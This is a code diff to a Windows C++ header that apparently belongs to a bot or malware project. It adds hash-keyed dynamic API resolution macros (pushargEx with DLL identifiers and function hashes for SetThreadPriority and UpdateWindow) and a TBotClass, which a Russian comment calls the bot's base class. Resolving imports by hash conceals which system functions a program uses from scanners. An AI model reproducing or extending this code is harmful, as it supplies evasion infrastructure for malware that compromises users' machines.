@@ -1,6 +1,9 @@
+
+#ifndef GetApiH
+#define GetApiH
+//----------------------------------------------------------------------------
 #pragma once
 #include <windows.h>
-#include <shlobj.h>
 
 
 //*******************************************************************
@@ -244,6 +247,7 @@ inline LPVOID pushargEx(A1 a1, A2 a2, A3 a3, A4 a4, A5 a5, A6 a6, A7 a7, A8 a8,
 #define pGetVersionExA 				pushargEx< DLL_KERNEL32, 0x9C480E24>
 #define pGetVersionExW 				pushargEx< DLL_KERNEL32, 0x9C480E32>
 #define pCreateThread 				pushargEx< DLL_KERNEL32, 0x6FB89AF0>
+#define pSetThreadPriority			pushargEx< DLL_KERNEL32, 0xBC262395>
 #define pCreateMutexA 				pushargEx< DLL_KERNEL32, 0xBF78969C>
 #define pCreateMutexW 				pushargEx< DLL_KERNEL32, 0xBF78968A>
 #define pReleaseMutex 				pushargEx< DLL_KERNEL32, 0xBB74A4A2>
@@ -371,9 +375,6 @@ inline LPVOID pushargEx(A1 a1, A2 a2, A3 a3, A4 a4, A5 a5, A6 a6, A7 a7, A8 a8,
 #define pGetPrivateProfileStringA	pushargEx< DLL_KERNEL32, 0xAA19E291>
 #define pProcess32FirstW 			pushargEx< DLL_KERNEL32, 0xFBC6485B>
 #define pProcess32NextW				pushargEx< DLL_KERNEL32, 0x98750F33>
-
-
-
 
 
 //advapi32
@@ -532,6 +533,7 @@ inline LPVOID pushargEx(A1 a1, A2 a2, A3 a3, A4 a4, A5 a5, A6 a6, A7 a7, A8 a8,
 #define pSetActiveWindow			pushargEx< DLL_USER32, 0xDB7C98FC>
 #define pSetCursorPos				pushargEx< DLL_USER32, 0xBDB58517>
 #define pAttachThreadInput			pushargEx< DLL_USER32, 0xE16B4137>
+#define pUpdateWindow				pushargEx< DLL_USER32, 0xFC3A1D7B>
 
 //winsock
 #define pWSACleanup 				pushargEx< DLL_WINSOCK, 0x8FB8B5BD>
@@ -737,3 +739,21 @@ inline LPVOID pushargEx(A1 a1, A2 a2, A3 a3, A4 a4, A5 a5, A6 a6, A7 a7, A8 a8,
 
 
 
+
+//****************************************************************
+//  TBotClass - базовый класс бота
+//****************************************************************
+
+
+class TBotClass
+{
+public:
+	void* operator new(size_t size);
+	void* operator new[](size_t size);
+	void  operator delete(void* Pointer);
+	void  operator delete[](void* Pointer);
+};
+
+
+//----------------------------------------------------------------------------
+#endif
